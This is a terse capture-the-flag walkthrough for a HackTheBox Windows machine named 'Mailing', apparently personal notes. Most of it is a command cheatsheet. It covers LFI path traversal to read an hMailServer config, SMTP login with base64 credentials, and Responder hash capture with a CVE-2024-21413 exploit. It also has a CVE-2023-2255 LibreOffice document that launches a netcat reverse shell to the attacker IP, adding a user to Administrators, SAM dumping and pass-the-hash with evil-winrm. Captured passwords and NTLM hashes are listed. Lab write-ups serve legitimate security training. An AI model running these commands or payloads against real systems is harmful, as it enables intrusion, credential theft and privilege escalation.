# Mailing \[Windows Easy]

## Report

An endpoint on the HTTP website is vulnerable to LFI, knowing the website is powered by hMailServer we can retrieve the .ini file and creds for 'administrator'. A google search for 'Windows mail CVE' shows CVE-2024-21413 where a zero-click attack retrieves creds for user 'maya'

LibreOffice is installed which stands out and another search shows a CVE where we can perform command execution. A reverse shell didn't work to plan so we added maya to the Administrators group, dump SAM and Admin hash

## Cheatsheet

```
curl 'http://mailing.htb/download.php?file=..\\..\\windows\\system32\\drivers\\etc\\hosts'
curl http://mailing.htb/download.php?file=../../wwwroot/download.php
curl 'http://mailing.htb/download.php?file=../../Program+Files+(x86)/hMailServer/bin/hMailServer.ini'

telnet 10.10.11.14 25
EHLO jtripz@glo.cc
AUTH LOGIN
YWRtaW5pc3RyYXRvckBtYWlsaW5nLmh0Yg== (administrator@mailing.htb)
aG9tZW5ldHdvcmtpbmdhZG1pbmlzdHJhdG9y

sudo responder -I tun0
python CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender 0xdf@mailing.htb --recipient maya@mailing.htb --url '\\10.10.14.4\share\sploit' --subject "Check this whoahhh out ASAP"

python3 CVE-2023-2255.py --cmd 'cmd.exe /c C:\ProgramData\nc64.exe -e cmd.exe 10.10.14.4 447' --output exploit2.odt
python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output exploit3.odt
crackmapexec smb 10.10.11.14 -u maya -p m4y4ngs4ri --sam
evil-winrm -i mailing.htb -u localadmin -H '9aa582783780d1546d62f2d102daefae'
```

## Loot

### Creds

administrator@mailing.htb:homenetworkingadministrator (hMailServer.ini)

maya::MAILING:349f1004cde3c3fa:AF6A8F54BF51CEF566C4E4B423519243:010100000000000080003BD488E1DB016B4F988338C25D0A00000000020008004B0055005A00540001001E00570049004E002D003800320036005800580048005A0048004A004600410004003400570049004E002D003800320036005800580048005A0048004A00460041002E004B0055005A0054002E004C004F00430041004C00030014004B0055005A0054002E004C004F00430041004C00050014004B0055005A0054002E004C004F00430041004C000700080080003BD488E1DB0106000400020000000800300030000000000000000000000000200000C2CEB665B4A8E61E72A873373E18D0BB0E8315F7B4B838399CBE212A1B16D1F70A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0034000000000000000000 (Responder)

maya:m4y4ngs4ri

### Proof

HTTP: get userlist for brute\
SMB: Access denied\
RPC: Access denied\
SMTP: Enumerating users got no results
